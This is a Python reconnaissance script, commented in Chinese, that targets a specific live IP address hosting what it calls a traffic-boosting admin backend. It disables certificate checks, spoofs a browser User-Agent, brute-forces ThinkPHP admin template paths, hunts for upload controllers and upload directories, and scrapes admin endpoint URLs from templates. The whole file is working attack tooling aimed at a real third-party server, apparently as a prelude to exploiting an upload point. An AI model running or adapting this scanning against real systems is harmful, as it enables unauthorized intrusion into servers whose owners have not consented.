#!/usr/bin/env python3
"""tp_deep2.py - 上量后台深挖: 模板枚举+上传点+接口地址"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
BASE = "https://139.196.199.221"

def get(path):
    try:
        r = urllib.request.urlopen(urllib.request.Request(BASE + path, headers=UA), timeout=6, context=ctx)
        return r.status, r.read(60000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def exists(path):
    st, b = get(path)
    return st == 200 and len(b) > 0

print("=== 1. view目录枚举 ===", flush=True)
for d in ["login", "index", "user", "system", "admin", "order", "product", "goods",
          "brand", "banner", "common", "export", "log", "finance", "public", "public/header",
          "public/footer", "layout"]:
    for f in ["index.html", "Index.html", "list.html", "List.html", "add.html", "Add.html",
              "edit.html", "Edit.html", "main.html", "Main.html", "login.html"]:
        p = "/application/admin/view/%s/%s" % (d, f)
        if exists(p):
            print("  FOUND: %s" % p, flush=True)

print("=== 2. 上传相关文件/控制器 ===", flush=True)
for p in ["/application/admin/controller/UploadController.php",
          "/application/admin/controller/File.php",
          "/application/admin/controller/Uploads.php",
          "/application/admin/controller/Img.php",
          "/application/admin/controller/Pic.php",
          "/application/admin/controller/Image.php",
          "/application/admin/controller/Picture.php",
          "/application/common/controller/Upload.php",
          "/public/uploads/", "/public/upload/", "/uploads/", "/upload/",
          "/public/uploads/images/", "/public/uploads/files/",
          "/static/upload/", "/static/uploads/"]:
    if exists(p):
        print("  FOUND: %s" % p, flush=True)

print("=== 3. 直接读模板内容(找接口) ===", flush=True)
for p in ["/application/admin/view/login/index.html",
          "/application/admin/view/index/index.html",
          "/application/admin/view/user/index.html",
          "/application/admin/view/order/index.html"]:
    st, b = get(p)
    print("-- %s (st=%s size=%d) --" % (p, st, len(b)), flush=True)
    if st == 200 and len(b) > 100:
        # 提取接口地址
        urls = sorted(set(re.findall(r'["\'](/admin/[^"\']*?\.html[^"\']*)["\']', b)))
        urls += sorted(set(re.findall(r'url\s*:\s*["\']([^"\']+)["\']', b)))
        urls += sorted(set(re.findall(r'action="([^"]+)"', b)))
        for u in urls[:25]:
            print("    URL: %s" % u, flush=True)

print("=== 4. 其他模块/应用探测 ===", flush=True)
for p in ["/application/home/", "/application/api/", "/application/index/",
          "/application/common/", "/application/extra/", "/application/admin/view/",
          "/application/admin/lang/", "/application/lang/", "/public/",
          "/public/static/js/admin.js", "/public/static/js/common.js",
          "/public/static/js/upload.js", "/static/js/upload.js",
          "/public/static/upload/", "/static/upload/"]:
    st, b = get(p)
    if st == 200 and len(b) > 50:
        print("  %s -> st=%d size=%d" % (p, st, len(b)), flush=True)

print("=== DONE ===", flush=True)
